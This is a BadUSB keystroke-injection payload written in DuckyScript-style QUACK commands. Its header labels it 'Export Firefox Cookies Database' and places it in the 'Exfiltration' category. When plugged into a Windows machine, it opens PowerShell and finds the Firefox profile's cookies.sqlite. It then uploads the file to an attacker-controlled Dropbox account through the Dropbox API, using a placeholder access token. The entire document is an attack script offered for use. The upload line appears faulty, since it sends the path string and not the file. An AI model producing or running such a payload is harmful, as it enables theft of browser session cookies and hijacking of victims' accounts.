* ####################################################
* #                                                  |
* # Title        : Export Firefox Cookies Database   |
* # Author       : Aleff                             |
* # Version      : 1.0                               |
* # Category     : Exfiltration                      |
* # Target       : Windows 10-11                     |
* #                                                  |
* ####################################################


* Requirements:
*     - Firefox must be installed


QUACK DELAY 1000
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 2000


* Get cookies DB path
QUACK STRING $firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
QUACK ENTER
QUACK STRING $firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}
QUACK ENTER
QUACK STRING $filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'
QUACK ENTER

* You must define your Dropbox accessToken or modify the exfiltration modality. Replace just the example word with your token.
QUACK STRING $accessToken="DROPBOX_ACCESS_TOKEN"
QUACK ENTER

QUACK STRING $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
    
QUACK ENTER
QUACK STRING $dropboxFilePath = "/cookies_exported.sqlite"

QUACK ENTER
QUACK STRING $headers = @{}
QUACK ENTER
QUACK STRING $headers.Add("Authorization", "Bearer $accessToken")
QUACK ENTER
QUACK STRING $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
QUACK ENTER
QUACK STRING $headers.Add("Content-Type", "application/octet-stream")

QUACK ENTER
QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $filePath; exit;
Update payload.txt
